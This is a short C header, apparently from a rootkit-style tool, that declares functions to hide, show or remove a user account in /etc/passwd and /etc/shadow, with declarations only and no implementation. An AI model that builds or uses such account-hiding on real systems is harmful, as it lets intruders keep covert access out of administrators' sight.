#ifndef GHOST_H
#define GHOST_H

#include "sctm.h"

/* hide/show a user in "/etc/passwd" and "/etc/shadow" */

/* remove a user from "/etc/password" and "/etc/shadow" */
int ghost(pid_t pid);

/* initialization */
int ghost_init(void);

#endif

